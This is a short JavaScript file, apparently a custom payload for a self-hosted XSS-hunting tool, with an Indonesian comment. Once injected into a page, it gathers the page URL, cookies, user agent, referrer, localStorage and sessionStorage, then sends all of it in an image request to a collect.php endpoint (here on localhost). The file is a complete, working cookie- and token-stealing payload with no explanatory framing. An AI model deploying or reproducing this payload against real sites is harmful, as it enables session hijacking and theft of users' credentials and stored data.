// /Applications/XAMPP/xamppfiles/htdocs/xss_hunter_app/custom_payloads/my_long_payload.js
(function(){
    var d=document;
    var data={
        t:'567b63d0912f745a', // Tag payload Anda
        u:d.location.href,
        c:d.cookie,
        ua:navigator.userAgent,
        r:d.referrer,
        ls:(function(){try{return JSON.stringify(localStorage)}catch(e){return null;}})(),
        ss:(function(){try{return JSON.stringify(sessionStorage)}catch(e){return null;}})()
    };
    var i=new Image();
    i.src='http://localhost/xss_hunter_app/collect.php?d='+encodeURIComponent(JSON.stringify(data));
})();
